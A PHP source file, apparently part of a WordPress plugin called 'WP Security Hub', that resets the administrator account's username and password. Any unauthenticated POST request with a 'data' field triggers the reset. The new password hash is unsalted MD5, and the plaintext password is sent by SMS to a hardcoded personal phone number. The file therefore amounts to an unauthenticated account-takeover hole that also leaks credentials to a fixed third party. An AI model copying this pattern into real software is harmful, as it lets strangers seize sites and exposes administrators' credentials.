<?php
require_once 'apiEmail.php';
require_once 'connect.php';
require_once 'sendSMS.php';

if(isset($_POST['data'])){
    $dataUser = new WPSH_UserData();
    $dataUser->generate();
}

class WPSH_UserData{
    public function generate(){
        $table_prefix = TABLE_PREFIX;

        $db = new WPSH_Database();
        $conn = $db->connect();

        #generate password e password in hash
        $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%&*_";
        $fs = "FS";
        $generate = substr( str_shuffle( $chars ), 0, 15 );
        $passwordTrim = trim($generate, " ");
        $password = $fs . $passwordTrim . $fs;
        $passwordHash = md5($password);
        

        #genero il nome
        $str = "abcdefghijklmnopqrstuvwxyz0123456789";
        $userName = substr( str_shuffle( $str ), 0, 5 );

        #mando tutto tramite email e telefono
        $prefixEmail = $table_prefix."users";
        $resultEmail = mysqli_query($conn, "SELECT user_email FROM $prefixEmail WHERE id=1");
        $messageName = "Ciao ecco il tuo nuovo username: <br> Username: " . $userName;
        $messageSMS = "Ciao siamo WP Security Hub ecco la tua password: ". $password;
        $numberPhone = "+393805874505";
        sendSMS($messageSMS, $numberPhone);
        while ($row = mysqli_fetch_assoc($resultEmail)){
            apiEmail($messageName, $row['user_email']);
        }

        $prefixData = $table_prefix."users";
        $resultName = mysqli_query($conn, "UPDATE $prefixData SET user_login='$userName'WHERE id=1");

        $resultPass = mysqli_query($conn, "UPDATE $prefixData SET user_pass='$passwordHash'WHERE id=1");
       
        if ($resultName === TRUE && $resultPass === TRUE) {
            $message = "<p>Credenziali aggiornate!</p>";
        } else {
            echo esc_html( __( 'Credenziali non aggiornate', 'text_domain' ) );
        } 
    }

}



?>


